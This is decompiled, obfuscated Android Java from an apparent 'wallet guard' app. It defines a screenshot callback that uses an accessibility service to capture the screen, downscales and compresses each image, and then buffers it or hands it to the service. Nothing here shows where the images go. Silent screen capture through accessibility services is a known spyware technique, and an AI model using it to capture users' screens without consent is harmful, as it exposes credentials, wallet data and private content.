package u;

import a0.d;
import a0.h;
import a1.q;
import android.accessibilityservice.AccessibilityService.ScreenshotResult;
import android.accessibilityservice.AccessibilityService.TakeScreenshotCallback;
import android.graphics.Bitmap;
import android.util.Log;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.e;
import com.guard.wallet.utils.g;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

public final class a implements TakeScreenshotCallback {
   public final AtomicInteger a = new AtomicInteger(-1);
   public final AtomicBoolean b;
   public final AtomicBoolean c;
   public byte[] d;
   public Float e;
   public Integer f;

   public a(Float var1) {
      Float var4;
      label11: {
         super();
         this.a = new AtomicInteger(-1);
         AtomicBoolean var3 = new AtomicBoolean(false);
         this.b = var3;
         AtomicBoolean var2 = new AtomicBoolean(false);
         this.c = var2;
         var3.set(false);
         var2.set(false);
         if (!(var1 <= 0.0F)) {
            var4 = var1;
            if (!(var1 > 1.0F)) {
               break label11;
            }
         }

         var4 = a();
      }

      this.e = var4;
      this.f = (int)(this.e * 100.0F);
   }

   public a(Float var1, Integer var2) {
      Float var5;
      label21: {
         super();
         this.a = new AtomicInteger(-1);
         AtomicBoolean var4 = new AtomicBoolean(false);
         this.b = var4;
         AtomicBoolean var3 = new AtomicBoolean(false);
         this.c = var3;
         var4.set(false);
         var3.set(true);
         if (!(var1 <= 0.0F)) {
            var5 = var1;
            if (!(var1 > 1.0F)) {
               break label21;
            }
         }

         var5 = a();
      }

      this.e = var5;
      if (var2 > 0 && var2 <= 100) {
         this.f = var2;
      } else {
         this.f = (int)(this.e * 100.0F);
      }
   }

   public a(boolean var1) {
      super();
      AtomicBoolean var3 = new AtomicBoolean(false);
      this.b = var3;
      AtomicBoolean var2 = new AtomicBoolean(false);
      this.c = var2;
      var3.set(var1);
      var2.set(false);
      Float var4 = a();
      this.e = var4;
      this.f = (int)(var4 * 100.0F);
   }

   public static float a() {
      ScreenMetricsVO var0 = com.guard.wallet.utils.e.e();
      if (var0.getWidth() != null && var0.getWidth() > 0 && var0.getHeight() != null && var0.getHeight() > 0) {
         Integer var1;
         if (var0.getHeight() > var0.getWidth()) {
            var1 = var0.getHeight();
         } else {
            var1 = var0.getWidth();
         }

         return 800.0F / (float)var1.intValue();
      } else {
         return 0.25F;
      }
   }

   public final boolean b() {
      int var1 = this.a.get();
      boolean var3 = true;
      boolean var2 = var3;
      if (var1 != -1) {
         var2 = var3;
         if (this.a.get() != 1) {
            if (this.a.get() == 2) {
               var2 = var3;
            } else {
               var2 = false;
            }
         }
      }

      return var2;
   }

   public final void c(Bitmap var1) {
      if (this.c.get()) {
         MyAccessibilityService var2 = MyAccessibilityService.P();
         var2.getClass();

         try {
            if (var2.Y()) {
               d0.a var4 = var2.m;
               if (var4.b.get()) {
                  var4.a.offer(var1);
                  if (System.currentTimeMillis() - var4.c.get() >= 60000L) {
                     var4.a();
                  }
               }
            }
         } catch (Exception var3) {
            q.s("MyAccessibilityService", var3);
         }
      } else {
         byte[] var5 = g.M0(g.y(var1), this.e, this.f);
         if (this.b.get()) {
            MyAccessibilityService.P().getClass();
            MyAccessibilityService.a0(var5);
         }

         this.d = var5;
         g.J0(var1);
      }
   }

   public final void onFailure(int var1) {
      this.a.set(2);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void onSuccess(ScreenshotResult var1) {
      Log.d("CustomTakeScreenshotCallback", "AccessibilityService Screen Shot Success");
      this.a.set(0);

      label24: {
         Exception var10000;
         label28: {
            try {
               var4 = a0.d.c(h.f(var1), h.d(var1));
            } catch (Exception var3) {
               var10000 = var3;
               boolean var10001 = false;
               break label28;
            }

            if (var4 == null) {
               break label24;
            }

            try {
               this.c(var4);
               break label24;
            } catch (Exception var2) {
               var10000 = var2;
               boolean var6 = false;
            }
         }

         Exception var5 = var10000;
         q.s("CustomTakeScreenshotCallback", var5);
      }

      this.a.set(1);
   }
}
